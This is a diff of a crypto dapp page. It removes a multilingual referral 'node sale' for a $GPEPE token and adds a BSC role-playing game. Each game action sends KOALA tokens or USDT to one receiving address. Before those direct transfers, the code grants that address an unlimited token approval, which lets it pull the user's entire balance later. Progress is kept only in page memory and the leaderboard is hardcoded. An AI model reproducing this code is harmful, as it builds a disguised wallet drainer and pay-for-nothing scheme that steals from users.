-        approving: 'Утверждение USDT...',
-        approveSuccess: 'Утверждение успешно',
-        transferring: 'Перевод ',
-        transferSuccess: 'Платёж успешен!',
-        pleaseSwitch: 'Пожалуйста, переключитесь на сеть BSC',
-        cancel: 'Пользователь отменил',
-        error: 'Ошибка',
-        armySubtitle: 'Присоединиться к Золотой Армии',
-        armyDesc: 'Прощай FOMO, привет Золотому Консенсусу. Будь спокойным создателем богатства.',
-        footerDesc: 'Присоединиться к Золотой Армии, будь спокойным создателем богатства. 💎',
-        myReferral: 'Поделиться с друзьями, привязать реферальную связь',
-        referrer: 'Мой реферальный адрес',
-        copyLink: '📋 Скопировать ссылку',
-        copySuccess: 'Ссылка скопирована!'
-      },
-      pt: {
-        subtitle: 'Diamond Hands · Consenso Dourado',
-        tagline1: '💎 Através de Bulls & Bears, Quebrando Regras',
-        tagline2: '💎 Construindo um Verdadeiro "Consenso Dourado" na BSC',
-        connectWallet: '💎 Conectar Carteira',
-        walletStatus: 'Não Conectado',
-        connected: '✅ Conectado',
-        myNodes: 'Meus Nós',
-        directTeam: '业绩 Time 1ª Geração',
-        totalTeam: '业绩 Total 15 Gerações',
-        nodePrice: 'Preço do Nó',
-        buyGold: '💎 Comprar Nó Dourado',
-        buySilver: '⚪ Comprar Nó Prateado',
-        buyCommunity: '🌱 Comprar Nó da Comunidade',
-        buyLight: '🔹 Comprar Nó Leve',
-        whyGpepe: 'Por Que Dourado?',
-        greenPepe: 'Green Pepe',
-        greenDesc: 'FOMO comprando alto, preso no topo. Sobe compra, desce pânico.',
-        blackPepe: 'Black Pepe',
-        blackDesc: 'Venda por pânico, cortando perdas. Compra sobe, venda desce.',
-        goldPepe: 'Golden Pepe',
-        goldDesc: 'O despertar final. Firme como diamante.',
-        mechanismSub: 'Sem Bobagem, Apenas Código.',
-        mechanismSub2: '100% Dirigido pela Comunidade, Código é Lei.',
-        noCabal: 'Sem Cabal',
-        noCabalDesc: 'Regras escritas no smart contract.',
-        communityWhale: 'Comunidade = Baleia',
-        communityWhaleDesc: 'Cada compra, posse e compartilhamento determina o destino do $GPEPE.',
-        onChain: 'Autopilot On-chain',
-        onChainDesc: 'Liquidez, liquidação, participação - tudo transparente on-chain.',
-        openSource: 'Contrato Open Source',
-        openSourceDesc: 'Código do contrato auditável, comunidade autônoma.',
-        liquidity: 'Injeção de Liquidez',
-        community: 'Comunidade',
-        goldRule: 'Regra Dourada · Comunidade em Primeiro Lugar',
-        roadmapSub: 'O Caminho Dourado',
-        roadmapSub2: 'O Caminho para o Trono Dourado',
-        phase1: 'PHASE 1 - O Despertar Dourado',
-        phase1Item1: 'Implantação do Contrato · Auditoria',
-        phase1Item2: 'Injeção de Liquidez',
-        phase1Item3: 'Lançamento de 1.000 Nós',
-        phase2: 'PHASE 2 - A Tempestade Dourada',
-        phase2Item1: 'Construção da Comunidade',
-        phase2Item2: 'Expansão Multilíngue',
-        phase2Item3: 'Listagem na CMC',
-        phase3: 'PHASE 3 - O Trono Dourado',
-        phase3Item1: 'Listagem na CEX',
-        phase3Item2: 'Início da Governança DAO',
-        phase3Item3: 'Lançamento do Ecossistema',
-        phase4: 'PHASE 4 - O Império Dourado',
-        phase4Item1: 'Ponte Cross-chain',
-        phase4Item2: 'Lançamento de Derivativos',
-        phase4Item3: 'Nível Institucional',
-        buyNode: 'Comprar Nó',
-        pleaseConnect: 'Por favor, conecte sua carteira',
-        pleaseInstall: 'Por favor, instale o MetaMask',
-        insufficientBalance: 'Saldo USDT insuficiente! Precisa de: ',
-        balanceOk: 'Saldo OK',
-        approving: 'Aprovando USDT...',
-        approveSuccess: 'Aprovação bem-sucedida',
-        transferring: 'Transferindo ',
-        transferSuccess: 'Pagamento bem-sucedido!',
-        pleaseSwitch: 'Por favor, mude para a rede BSC',
-        cancel: 'Usuário cancelou',
-        error: 'Erro',
-        armySubtitle: 'Junte-se ao Exército Dourado',
-        armyDesc: 'Diga adeus ao FOMO. Abrace o Consenso Dourado. Seja um construtor de riqueza calmo.',
-        footerDesc: 'Junte-se ao Exército Dourado, seja um construtor de riqueza calmo. 💎',
-        myReferral: 'Compartilhe com amigos, vincule relação de indicação',
-        referrer: 'Meu endereço de indicação',
-        copyLink: '📋 Copiar link',
-        copySuccess: 'Link copiado!'
-      },
-      es: {
-        subtitle: 'Diamond Hands · Consenso Dorado',
-        tagline1: '💎 A través de Bulls & Bears, Rompiendo Reglas',
-        tagline2: '💎 Construyendo un Verdadero "Consenso Dorado" en BSC',
-        connectWallet: '💎 Conectar Cartera',
-        walletStatus: 'No Conectado',
-        connected: '✅ Conectado',
-        myNodes: 'Mis Nodos',
-        directTeam: '业绩 Equipo 1ª Generación',
-        totalTeam: '业绩 Total 15 Generaciones',
-        nodePrice: 'Precio del Nodo',
-        buyGold: '💎 Comprar Nodo Dorado',
-        buySilver: '⚪ Comprar Nodo Plateado',
-        buyCommunity: '🌱 Comprar Nodo Comunidad',
-        buyLight: '🔹 Comprar Nodo Ligero',
-        whyGpepe: '¿Por Qué Dorado?',
-        greenPepe: 'Green Pepe',
-        greenDesc: 'FOMO comprando alto, atrapado en la cima. Sube compra, baja pánico.',
-        blackPepe: 'Black Pepe',
-        blackDesc: 'Venta por pánico, cortando pérdidas. Compra sube, venta baja.',
-        goldPepe: 'Golden Pepe',
-        goldDesc: 'El despertar final. Firme como diamante.',
-        mechanismSub: 'Sin Tonterías, Solo Código.',
-        mechanismSub2: '100% Guiado por la Comunidad, Código es Ley.',
-        noCabal: 'Sin Cabal',
-        noCabalDesc: 'Reglas escritas en el smart contract.',
-        communityWhale: 'Comunidad = Ballena',
-        communityWhaleDesc: 'Cada compra, posesión y compartir determina el destino de $GPEPE.',
-        onChain: 'Autopilot On-chain',
-        onChainDesc: 'Liquidez, liquidación, participación - todo transparente on-chain.',
-        openSource: 'Contrato Open Source',
-        openSourceDesc: 'Código del contrato auditado, comunidad autónoma.',
-        liquidity: 'Inyección de Liquidez',
-        community: 'Comunidad',
-        goldRule: 'Regla Dorada · Comunidad Primero',
-        roadmapSub: 'El Camino Dorado',
-        roadmapSub2: 'El Camino al Trono Dorado',
-        phase1: 'PHASE 1 - El Despertar Dorado',
-        phase1Item1: 'Despliegue del Contrato · Auditoría',
-        phase1Item2: 'Inyección de Liquidez',
-        phase1Item3: 'Lanzamiento de 1.000 Nodos',
-        phase2: 'PHASE 2 - La Tormenta Dorada',
-        phase2Item1: 'Construcción de la Comunidad',
-        phase2Item2: 'Expansión Multilingüe',
-        phase2Item3: 'Listado en CMC',
-        phase3: 'PHASE 3 - El Trono Dorado',
-        phase3Item1: 'Listado en CEX',
-        phase3Item2: 'Inicio de la Gobernanza DAO',
-        phase3Item3: 'Lanzamiento del Ecosistema',
-        phase4: 'PHASE 4 - El Imperio Dorado',
-        phase4Item1: 'Puente Cross-chain',
-        phase4Item2: 'Lanzamiento de Derivados',
-        phase4Item3: 'Nivel Institucional',
-        buyNode: 'Comprar Nodo',
-        pleaseConnect: 'Por favor, conecta tu cartera',
-        pleaseInstall: 'Por favor, instala MetaMask',
-        insufficientBalance: '¡Saldo USDT insuficiente! Necesitas: ',
-        balanceOk: 'Saldo OK',
-        approving: 'Aprobando USDT...',
-        approveSuccess: 'Aprobación exitosa',
-        transferring: 'Transferiendo ',
-        transferSuccess: '¡Pago exitoso!',
-        pleaseSwitch: 'Por favor, cambia a la red BSC',
-        cancel: 'Usuario canceló',
-        error: 'Error',
-        armySubtitle: 'Únete al Ejército Dorado',
-        armyDesc: 'Di adiós al FOMO. Abraza el Consenso Dorado. Sé un constructor de riqueza tranquilo.',
-        footerDesc: 'Únete al Ejército Dorado, sé un constructor de riqueza tranquilo. 💎',
-        myReferral: 'Comparte con amigos, vincula relación de referido',
-        referrer: 'Mi dirección de referido',
-        copyLink: '📋 Copiar enlace',
-        copySuccess: 'Enlace copiado!'
-      },
-      fr: {
-        subtitle: 'Diamond Hands · Consensus d\'Or',
-        tagline1: '💎 À travers Bulls & Bears, Briser les Règles',
-        tagline2: '💎 Construire un Vrai "Consensus d\'Or" sur BSC',
-        connectWallet: '💎 Connecter le Portefeuille',
-        walletStatus: 'Non Connecté',
-        connected: '✅ Connecté',
-        myNodes: 'Mes Nœuds',
-        directTeam: '业绩 Équipe 1ère Génération',
-        totalTeam: '业绩 Total 15 Générations',
-        nodePrice: 'Prix du Nœud',
-        buyGold: '💎 Acheter Nœud d\'Or',
-        buySilver: '⚪ Acheter Nœud d\'Argent',
-        buyCommunity: '🌱 Acheter Nœud Communautaire',
-        buyLight: '🔹 Acheter Nœud Léger',
-        whyGpepe: 'Pourquoi Or?',
-        greenPepe: 'Green Pepe',
-        greenDesc: 'FOMO achetant cher, coincé au sommet. Monte achète, descend panique.',
-        blackPepe: 'Black Pepe',
-        blackDesc: 'Vente panique, coupant les pertes. Achete monte, vend descend.',
-        goldPepe: 'Golden Pepe',
-        goldDesc: 'L\'éveil final. Solide comme un diamant.',
-        mechanismSub: 'Pas de Bêtises, Que du Code.',
-        mechanismSub2: '100% Dirigé par la Communauté, le Code est la Loi.',
-        noCabal: 'Pas de Cabale',
-        noCabalDesc: 'Règles écrites dans le smart contract.',
-        communityWhale: 'Communauté = Baleine',
-        communityWhaleDesc: 'Chaque achat, détention et partage déterminent le destin de $GPEPE.',
-        onChain: 'Autopilote On-chain',
-        onChainDesc: 'Liquidité, règlement, participation - tout transparent sur la chaîne.',
-        openSource: 'Contrat Open Source',
-        openSourceDesc: 'Code du contrat auditable, communauté autonome.',
-        liquidity: 'Injection de Liquidité',
-        community: 'Communauté',
-        goldRule: 'Règle d\'Or · Communauté d\'Abord',
-        roadmapSub: 'Le Chemin d\'Or',
-        roadmapSub2: 'Le Chemin vers le Trône d\'Or',
-        phase1: 'PHASE 1 - L\'Éveil d\'Or',
-        phase1Item1: 'Déploiement du Contrat · Audit',
-        phase1Item2: 'Injection de Liquidité',
-        phase1Item3: 'Lancement de 1.000 Nœuds',
-        phase2: 'PHASE 2 - La Tempête d\'Or',
-        phase2Item1: 'Construction de la Communauté',
-        phase2Item2: 'Expansion Multilingue',
-        phase2Item3: 'Listing sur CMC',
-        phase3: 'PHASE 3 - Le Trône d\'Or',
-        phase3Item1: 'Listing sur CEX',
-        phase3Item2: 'Lancement de la Gouvernance DAO',
-        phase3Item3: 'Lancement de l\'Écosystème',
-        phase4: 'PHASE 4 - L\'Empire d\'Or',
-        phase4Item1: 'Pont Cross-chain',
-        phase4Item2: 'Lancement des Dérivés',
-        phase4Item3: 'Niveau Institutionnel',
-        buyNode: 'Acheter Nœud',
-        pleaseConnect: 'Veuillez connecter votre portefeuille',
-        pleaseInstall: 'Veuillez installer MetaMask',
-        insufficientBalance: 'Solde USDT insuffisant! Besoin de: ',
-        balanceOk: 'Solde OK',
-        approving: 'Approbation USDT...',
-        approveSuccess: 'Approbation réussie',
-        transferring: 'Transfert ',
-        transferSuccess: 'Paiement réussi!',
-        pleaseSwitch: 'Veuillez passer au réseau BSC',
-        cancel: 'Utilisateur annulé',
-        error: 'Erreur',
-        armySubtitle: 'Rejoignez l\'Armée d\'Or',
-        armyDesc: 'Dites au revoir au FOMO. Adoptez le Consensus d\'Or. Soyez un bâtisseur de richesse calme.',
-        footerDesc: 'Rejoignez l\'Armée d\'Or, soyez un bâtisseur de richesse calme. 💎',
-        myReferral: 'Partagez avec amis, liez relation de parrainage',
-        referrer: 'Mon adresse de parrain',
-        copyLink: '📋 Copier le lien',
-        copySuccess: 'Lien copié!'
-      }
+
+    const leaderboardData = [
+      { name: '战神归来', class: 'warrior', level: 50, atk: 500, def: 300, hp: 5000 },
+      { name: '魔法至尊', class: 'mage', level: 48, atk: 600, def: 200, hp: 3500 },
+      { name: '神箭手', class: 'archer', level: 45, atk: 550, def: 250, hp: 4000 },
+      { name: '屠龙勇士', class: 'warrior', level: 42, atk: 450, def: 280, hp: 4500 },
+      { name: '元素使者', class: 'mage', level: 40, atk: 480, def: 180, hp: 3200 },
+      { name: '丛林猎手', class: 'archer', level: 38, atk: 420, def: 220, hp: 3800 },
+      { name: '圣骑士', class: 'warrior', level: 35, atk: 380, def: 320, hp: 5200 },
+      { name: '暗影法师', class: 'mage', level: 33, atk: 400, def: 150, hp: 2800 },
+      { name: '鹰眼', class: 'archer', level: 30, atk: 350, def: 190, hp: 3400 },
+      { name: '狂战士', class: 'warrior', level: 28, atk: 320, def: 200, hp: 4000 }
+    ];
+
+    // 状态
+    let provider, signer, userAddress;
+    let koalaContract, usdtContract;
+    let currentKoalaBalance = 0;
+    let character = {
+      name: '传奇勇士',
+      class: 'warrior',
+      level: 1,
+      atk: 10,
+      def: 5,
+      hp: 100,
+      exp: 0
     };
-    
-    let web3, currentAccount, signer;
-    let currentLang = 'zh';
-    let referrerAddress = null;
-    let myReferralLink = '';
-    
-    function t(key) {
-      return I18N[currentLang][key] || key;
-    }
-    
-    function setLang(lang) {
-      currentLang = lang;
-      const langNames = {
-        'zh': '中文',
-        'en': 'English',
-        'ko': '한국어',
-        'ja': '日本語',
-        'th': 'ภาษาไทย',
-        'vi': 'Tiếng Việt',
-        'id': 'Bahasa Indonesia',
-        'ms': 'Bahasa Melayu',
-        'ru': 'Русский',
-        'pt': 'Português',
-        'es': 'Español',
-        'fr': 'Français'
-      };
-      document.getElementById('langText').textContent = langNames[lang] || 'English';
-      
-      document.getElementById('checkZh').textContent = lang === 'zh' ? '✓' : '';
-      document.getElementById('checkEn').textContent = lang === 'en' ? '✓' : '';
-      document.getElementById('checkKo').textContent = lang === 'ko' ? '✓' : '';
-      document.getElementById('checkJa').textContent = lang === 'ja' ? '✓' : '';
-      document.getElementById('checkTh').textContent = lang === 'th' ? '✓' : '';
-      document.getElementById('checkVi').textContent = lang === 'vi' ? '✓' : '';
-      document.getElementById('checkId').textContent = lang === 'id' ? '✓' : '';
-      document.getElementById('checkMs').textContent = lang === 'ms' ? '✓' : '';
-      document.getElementById('checkRu').textContent = lang === 'ru' ? '✓' : '';
-      document.getElementById('checkPt').textContent = lang === 'pt' ? '✓' : '';
-      document.getElementById('checkEs').textContent = lang === 'es' ? '✓' : '';
-      document.getElementById('checkFr').textContent = lang === 'fr' ? '✓' : '';
-      
-      document.getElementById('langPanel').classList.remove('show');
-      updateAllText();
-    }
-    
-    function toggleLangPanel() {
-      const panel = document.getElementById('langPanel');
-      panel.classList.toggle('show');
-    }
-    
-    document.addEventListener('click', function(e) {
-      const btn = document.getElementById('langBtn');
-      const panel = document.getElementById('langPanel');
-      if (!btn.contains(e.target) && !panel.contains(e.target)) {
-        panel.classList.remove('show');
-      }
-    });
-    
-    function updateAllText() {
-      document.getElementById('subtitle').textContent = t('subtitle');
-      document.getElementById('tagline').innerHTML = t('tagline1') + '<br>' + t('tagline2');
-      document.getElementById('connectBtn').textContent = t('connectWallet');
-      document.getElementById('myNodesLabel').textContent = t('myNodes');
-      document.getElementById('directTeamLabel').textContent = t('directTeam');
-      document.getElementById('totalTeamLabel').textContent = t('totalTeam');
-      document.getElementById('nodePriceLabel').textContent = t('nodePrice');
-      document.getElementById('buyGoldBtn').textContent = t('buyGold');
-      document.getElementById('buySilverBtn').textContent = t('buySilver');
-      document.getElementById('buyCommunityBtn').textContent = t('buyCommunity');
-      document.getElementById('buyLightBtn').textContent = t('buyLight');
-      document.getElementById('whyGpepeSub').textContent = t('whyGpepe');
-      document.getElementById('greenPepeTitle').textContent = t('greenPepe');
-      document.getElementById('greenPepeDesc').textContent = t('greenDesc');
-      document.getElementById('blackPepeTitle').textContent = t('blackPepe');
-      document.getElementById('blackPepeDesc').textContent = t('blackDesc');
-      document.getElementById('goldPepeTitle').textContent = t('goldPepe');
-      document.getElementById('goldPepeDesc').textContent = t('goldDesc');
-      document.getElementById('mechanismSub1').textContent = t('mechanismSub');
-      document.getElementById('mechanismSub2').textContent = t('mechanismSub2');
-      document.getElementById('noCabalTitle').textContent = t('noCabal');
-      document.getElementById('noCabalDesc').textContent = t('noCabalDesc');
-      document.getElementById('communityWhaleTitle').textContent = t('communityWhale');
-      document.getElementById('communityWhaleDesc').textContent = t('communityWhaleDesc');
-      document.getElementById('onChainTitle').textContent = t('onChain');
-      document.getElementById('onChainDesc').textContent = t('onChainDesc');
-      document.getElementById('openSourceTitle').textContent = t('openSource');
-      document.getElementById('openSourceDesc').textContent = t('openSourceDesc');
-      document.getElementById('liquidityLabel').textContent = t('liquidity');
-      document.getElementById('communityLabel').textContent = t('community');
-      document.getElementById('goldRule').textContent = t('goldRule');
-      document.getElementById('roadmapSub1').textContent = t('roadmapSub');
-      document.getElementById('roadmapSub2').textContent = t('roadmapSub2');
-      document.getElementById('phase1').textContent = t('phase1');
-      document.getElementById('phase1Item1').textContent = t('phase1Item1');
-      document.getElementById('phase1Item2').textContent = t('phase1Item2');
-      document.getElementById('phase1Item3').textContent = t('phase1Item3');
-      document.getElementById('phase2').textContent = t('phase2');
-      document.getElementById('phase2Item1').textContent = t('phase2Item1');
-      document.getElementById('phase2Item2').textContent = t('phase2Item2');
-      document.getElementById('phase2Item3').textContent = t('phase2Item3');
-      document.getElementById('phase3').textContent = t('phase3');
-      document.getElementById('phase3Item1').textContent = t('phase3Item1');
-      document.getElementById('phase3Item2').textContent = t('phase3Item2');
-      document.getElementById('phase3Item3').textContent = t('phase3Item3');
-      document.getElementById('phase4').textContent = t('phase4');
-      document.getElementById('phase4Item1').textContent = t('phase4Item1');
-      document.getElementById('phase4Item2').textContent = t('phase4Item2');
-      document.getElementById('phase4Item3').textContent = t('phase4Item3');
-      document.getElementById('armySubtitle').textContent = t('armySubtitle');
-      document.getElementById('armyDesc').textContent = t('armyDesc');
-      document.getElementById('footerDesc').textContent = t('footerDesc');
-      
-      document.getElementById('myReferralLabel').textContent = t('myReferral');
-      document.getElementById('referrerLabel').textContent = t('referrer');
-      document.getElementById('copyBtn').textContent = t('copyLink');
-    }
-    
-    function parseReferrer() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const ref = urlParams.get('ref');
-      if (ref && ref.length === 42 && ref.startsWith('0x')) {
-        referrerAddress = ref.toLowerCase();
-      }
-    }
-    
-    function generateReferralLink() {
-      if (!currentAccount) return '';
-      const baseUrl = window.location.origin + window.location.pathname;
-      return baseUrl + '?ref=' + currentAccount.toLowerCase();
-    }
-    
-    async function copyReferralLink() {
-      const link = generateReferralLink();
-      if (!link) {
-        alert(t('pleaseConnect'));
-        return;
-      }
-      try {
-        await navigator.clipboard.writeText(link);
-        alert(t('copySuccess'));
-      } catch (e) {
-        const textarea = document.createElement('textarea');
-        textarea.value = link;
-        document.body.appendChild(textarea);
-        textarea.select();
-        document.execCommand('copy');
-        document.body.removeChild(textarea);
-        alert(t('copySuccess'));
-      }
-    }
-    
-    async function bindReferrer() {
-      if (!currentAccount || !referrerAddress) return;
-      if (currentAccount.toLowerCase() === referrerAddress.toLowerCase()) {
-        return;
-      }
-      try {
-        const referralContract = new ethers.Contract(CONFIG.REFERRAL_CONTRACT, CONFIG.REFERRAL_ABI, signer);
-        const tx = await referralContract.bindReferrer(referrerAddress);
-        await tx.wait();
-        referrerAddress = null;
-      } catch (e) {
-        console.log('绑定推荐人失败:', e);
-      }
-    }
-    
+    let inventory = [];
+
+    // 连接钱包
     async function connectWallet() {
       if (typeof window.ethereum === 'undefined') {
-        alert(t('pleaseInstall'));
+        showToast('请安装MetaMask钱包', 'error');
         return;
       }
-      
+
+      showLoading(true);
       try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send('eth_requestAccounts', []);
+        signer = provider.getSigner();
+        userAddress = await signer.getAddress();
+
+        const network = await provider.getNetwork();
+        if (network.chainId !== 56) {
+          showToast('请切换到BSC主网', 'error');
+          showLoading(false);
+          return;
+        }
+
+        koalaContract = new ethers.Contract(KOALA_ADDRESS, KOALA_ABI, signer);
+        usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
+
+        document.getElementById('walletAddress').textContent = 
+          userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
+        document.getElementById('connectBtn').textContent = '已连接';
+        document.getElementById('connectBtn').disabled = true;
+        document.getElementById('rechargeBtn').disabled = false;
+        document.getElementById('partnerBtn').disabled = false;
+        document.getElementById('characterSection').style.display = 'block';
+        document.getElementById('inventorySection').style.display = 'block';
+
+        await updateBalances();
+        initGame();
+
+        showToast('钱包连接成功', 'success');
+      } catch (e) {
+        showToast('连接失败: ' + e.message, 'error');
+      }
+      showLoading(false);
+    }
+
+    // 更新余额
+    async function updateBalances() {
+      try {
+        const bnbBal = await signer.getBalance();
+        document.getElementById('bnbBalance').textContent = 
+          parseFloat(ethers.utils.formatEther(bnbBal)).toFixed(4);
+
+        const usdtBal = await usdtContract.balanceOf(userAddress);
+        const usdtDecimals = await usdtContract.decimals();
+        document.getElementById('usdtBalance').textContent = 
+          parseFloat(ethers.utils.formatUnits(usdtBal, usdtDecimals)).toFixed(2);
+
+        const koalaBal = await koalaContract.balanceOf(userAddress);
+        const koalaDecimals = await koalaContract.decimals();
+        currentKoalaBalance = parseFloat(ethers.utils.formatUnits(koalaBal, koalaDecimals));
+        document.getElementById('koalaBalance').textContent = currentKoalaBalance.toFixed(2);
+
+        updateGameUI();
+      } catch (e) {
+        console.error('获取余额失败:', e);
+      }
+    }
+
+    // 设置充值金额
+    function setRechargeAmount(amount) {
+      document.getElementById('rechargeAmount').value = amount;
+      document.querySelectorAll('.preset-btn').forEach(btn => {
+        btn.classList.remove('active');
+        if (btn.textContent == amount + ' 传奇币') btn.classList.add('active');
+      });
+    }
+
+    // 设置合伙人份数（固定为1）
+    function setPartnerCount(count) {
+      document.getElementById('partnerCount').value = 1;
+    }
+
+    // 充值传奇人生币
+    async function rechargeKoala() {
+      const amount = document.getElementById('rechargeAmount').value;
+      if (!amount || amount <= 0) {
+        showToast('请输入有效金额', 'error');
+        return;
+      }
+
+      showLoading(true);
+      try {
+        const decimals = await koalaContract.decimals();
+        const amountWei = ethers.utils.parseUnits(amount, decimals);
         
-        web3 = new ethers.providers.Web3Provider(window.ethereum);
-        signer = web3.getSigner();
-        currentAccount = accounts[0];
+        const allowance = await koalaContract.allowance(userAddress, RECEIVE_ADDRESS);
+        if (allowance.lt(amountWei)) {
+          showToast('正在授权传奇人生币...', 'success');
+          await koalaContract.approve(RECEIVE_ADDRESS, ethers.constants.MaxUint256);
+        }
+
+        showToast('正在转账传奇人生币...', 'success');
+        const tx = await koalaContract.transfer(RECEIVE_ADDRESS, amountWei);
+        await tx.wait();
+
+        showToast('充值传奇人生成功！', 'success');
+        await updateBalances();
+      } catch (e) {
+        showToast('充值失败: ' + e.message, 'error');
+      }
+      showLoading(false);
+    }
+
+    // 成为合伙人
+    async function becomePartner() {
+      const count = 1;
+      const totalAmount = 100;
+
+      showLoading(true);
+      try {
+        const usdtDecimals = await usdtContract.decimals();
+        const amountWei = ethers.utils.parseUnits(totalAmount.toString(), usdtDecimals);
         
-        await updateStats();
+        const allowance = await usdtContract.allowance(userAddress, RECEIVE_ADDRESS);
+        if (allowance.lt(amountWei)) {
+          showToast('正在授权USDT...', 'success');
+          await usdtContract.approve(RECEIVE_ADDRESS, ethers.constants.MaxUint256);
+        }
+
+        showToast('正在支付...', 'success');
+        const tx = await usdtContract.transfer(RECEIVE_ADDRESS, amountWei);
+        await tx.wait();
+
+        showToast(`成功购买 ${count} 份合伙人权益！`, 'success');
+        await updateBalances();
+      } catch (e) {
+        showToast('购买失败: ' + e.message, 'error');
+      }
+      showLoading(false);
+    }
+
+    // 切换标签页
+    function switchTab(tab) {
+      document.querySelectorAll('.game-tab').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.game-panel').forEach(p => p.classList.remove('active'));
+      
+      event.target.classList.add('active');
+      document.getElementById(tab + 'Panel').classList.add('active');
+      
+      if (tab === 'leaderboard') {
+        renderLeaderboard();
+      }
+    }
+
+    function getPower(char) {
+      return char.atk * 2 + char.def * 1.5 + char.hp * 0.1 + char.level * 10;
+    }
+
+    function renderLeaderboard() {
+      const list = document.getElementById('leaderboardList');
+      const myRankDisplay = document.getElementById('myRankDisplay');
+      
+      const sortedData = [...leaderboardData].sort((a, b) => getPower(b) - getPower(a));
+      
+      let html = '';
+      sortedData.forEach((player, index) => {
+        const rank = index + 1;
+        const power = Math.floor(getPower(player));
+        const cls = classData[player.class];
+        const topClass = rank <= 3 ? `top-${rank}` : '';
         
-        await bindReferrer();
-        updateReferralLink();
-        
-        window.ethereum.on('accountsChanged', (accounts) => {
-          if (accounts.length > 0) {
-            currentAccount = accounts[0];
-            updateStats();
-            updateReferralLink();
-          } else {
-            disconnectWallet();
+        html += `
+          <li class="leaderboard-item ${topClass}">
+            <span class="rank-number ${topClass}">${rank}</span>
+            <span>${player.name}</span>
+            <span>${cls.icon} ${cls.name}</span>
+            <span>Lv.${player.level}</span>
+            <span>${power}</span>
+          </li>
+        `;
+      });
+      
+      list.innerHTML = html;
+      
+      const myPower = Math.floor(getPower(character));
+      const myRank = sortedData.filter(p => getPower(p) > myPower).length + 1;
+      const myCls = classData[character.class];
+      
+      myRankDisplay.innerHTML = `
+        我的排名: 第 ${myRank} 名 | ${myCls.icon} ${character.name} | Lv.${character.level} | 战力: ${myPower}
+      `;
+    }
+
+    // 初始化游戏
+    function initGame() {
+      const equipGrid = document.getElementById('equipmentGrid');
+      equipGrid.innerHTML = equipmentData.map(e => `
+        <div class="equipment-item" onclick="synthesize('${e.id}')">
+          <div class="equipment-icon">${e.icon}</div>
+          <div class="equipment-name">${e.name}</div>
+          <div class="equipment-cost">${e.cost} 传奇币</div>
+          <div class="equipment-level">需求Lv.${e.level}</div>
+        </div>
+      `).join('');
+
+      const questList = document.getElementById('questList');
+      questList.innerHTML = questData.map(q => `
+        <div class="quest-item">
+          <div class="quest-icon">${q.icon}</div>
+          <div class="quest-info">
+            <div class="quest-name">${q.name}</div>
+            <div class="quest-desc">${q.desc}</div>
+            <div class="quest-reward">消耗: ${q.cost} 传奇币 | ${q.reward}</div>
+          </div>
+          <button class="quest-action" onclick="doQuest('${q.id}')">执行</button>
+        </div>
+      `).join('');
+
+      const bossList = document.getElementById('bossList');
+      bossList.innerHTML = bossData.map(b => `
+        <div class="quest-item">
+          <div class="quest-icon">${b.icon}</div>
+          <div class="quest-info">
+            <div class="quest-name">${b.name}</div>
+            <div class="quest-desc">${b.desc}</div>
+            <div class="quest-reward">消耗: ${b.cost} 传奇币 | 奖励: ${b.reward}</div>
+          </div>
+          <button class="quest-action" onclick="fightBoss('${b.id}')">挑战</button>
+        </div>
+      `).join('');
+
+      updateInventory();
+      updateGameUI();
+    }
+
+    // 更新游戏UI状态
+    function updateGameUI() {
+      equipmentData.forEach(e => {
+        const items = document.querySelectorAll('.equipment-item');
+        items.forEach(item => {
+          if (item.onclick.toString().includes(e.id)) {
+            if (currentKoalaBalance < e.cost || character.level < e.level) {
+              item.classList.add('disabled');
+            } else {
+              item.classList.remove('disabled');
+            }
           }
         });
+      });
+
+      const actions = document.querySelectorAll('.quest-action');
+      actions.forEach(action => {
+        action.classList.remove('disabled');
+      });
+    }
+
+    // 合成装备
+    async function synthesize(equipId) {
+      const equip = equipmentData.find(e => e.id === equipId);
+      if (!equip) return;
+
+      if (character.level < equip.level) {
+        showToast(`需要达到Lv.${equip.level}才能合成`, 'error');
+        return;
+      }
+
+      if (currentKoalaBalance < equip.cost) {
+        showToast('传奇币余额不足，请先充值', 'error');
+        return;
+      }
+
+      showLoading(true);
+      try {
+        const decimals = await koalaContract.decimals();
+        const costAmount = ethers.utils.parseUnits(equip.cost.toString(), decimals);
         
+        const tx = await koalaContract.transfer(RECEIVE_ADDRESS, costAmount);
+        await tx.wait();
+
+        inventory.push(equip);
+        character.atk += equip.atk || 0;
+        character.def += equip.def || 0;
+        character.hp += equip.hp || 0;
+        character.exp += 50;
+
+        updateCharacter();
+        updateInventory();
+        await updateBalances();
+
+        showToast(`成功合成 ${equip.name}！`, 'success');
       } catch (e) {
-        if (e.code === 4001) {
-          alert(t('cancel'));
+        showToast('合成失败: ' + e.message, 'error');
+      }
+      showLoading(false);
+    }
+
+    // 执行任务
+    async function doQuest(questId) {
+      const quest = questData.find(q => q.id === questId);
+      if (!quest) return;
+
+      if (currentKoalaBalance < quest.cost) {
+        showToast('传奇币余额不足，请先充值', 'error');
+        return;
+      }
+
+      showLoading(true);
+      try {
+        const decimals = await koalaContract.decimals();
+        const costAmount = ethers.utils.parseUnits(quest.cost.toString(), decimals);
+        
+        const tx = await koalaContract.transfer(RECEIVE_ADDRESS, costAmount);
+        await tx.wait();
+
+        character.exp += 100;
+        if (character.exp >= character.level * 200) {
+          character.level++;
+          character.atk += 5;
+          character.def += 3;
+          character.hp += 20;
+          showToast(`升级！当前Lv.${character.level}`, 'success');
+        }
+
+        updateCharacter();
+        await updateBalances();
+
+        showToast(`任务 ${quest.name} 完成！`, 'success');
+      } catch (e) {
+        showToast('任务失败: ' + e.message, 'error');
+      }
+      showLoading(false);
+    }
+
+    // BOSS挑战
+    async function fightBoss(bossId) {
+      const boss = bossData.find(b => b.id === bossId);
+      if (!boss) return;
+
+      if (currentKoalaBalance < boss.cost) {
+        showToast('传奇币余额不足，请先充值', 'error');
+        return;
+      }
+
+      showSkillEffect();
+
+      showLoading(true);
+      try {
+        const decimals = await koalaContract.decimals();
+        const costAmount = ethers.utils.parseUnits(boss.cost.toString(), decimals);
+        
+        const tx = await koalaContract.transfer(RECEIVE_ADDRESS, costAmount);
+        await tx.wait();
+
+        character.exp += 500;
+        character.atk += 20;
+        character.def += 10;
+        character.hp += 50;
+
+        if (character.exp >= character.level * 200) {
+          character.level++;
+          showToast(`升级！当前Lv.${character.level}`, 'success');
+        }
+
